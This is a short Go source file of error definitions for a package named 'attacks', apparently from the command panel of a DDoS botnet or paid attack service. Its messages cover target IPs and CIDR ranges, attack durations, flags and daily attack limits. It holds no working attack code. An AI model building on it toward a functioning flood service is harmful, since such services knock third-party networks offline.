package attacks

import (
	"errors"
)

var (
	ErrNotEnoughArgs = errors.New("method <target> <port> <duration> <len> [...options]")

	ErrTooManyTargets   = errors.New("You cannot specify more than 255 targets in a single attack")
	ErrInvalidHost      = errors.New("Invalid target, example: 70.70.70.72,70.70.70.0/24")
	ErrInvalidDuration  = errors.New("Invalid duration. Duration must be 1-60 seconds")
	ErrBlankTarget      = errors.New("Blank target specified")
	ErrTooManySlashes   = errors.New("Too many /'s in prefix")
	ErrInvalidCidr      = errors.New("Invalid cidr")
	ErrBlankDuration    = errors.New("Please specify an attack duration")
	ErrInvalidKeyVal    = errors.New("Invalid key=value flag")
	ErrInvalidFlag      = errors.New("Invalid flag key")
	ErrTooManyFlags     = errors.New("You cannot have more than 255 flags")
	ErrTooManyFlagBytes = errors.New("Flag value cannot be more than 255 bytes")
	ErrNoAttacksLeft    = errors.New("You have reached your daily attack limit")
	ErrAttacksDisabled  = errors.New("Global attacks are currently disabled")
)
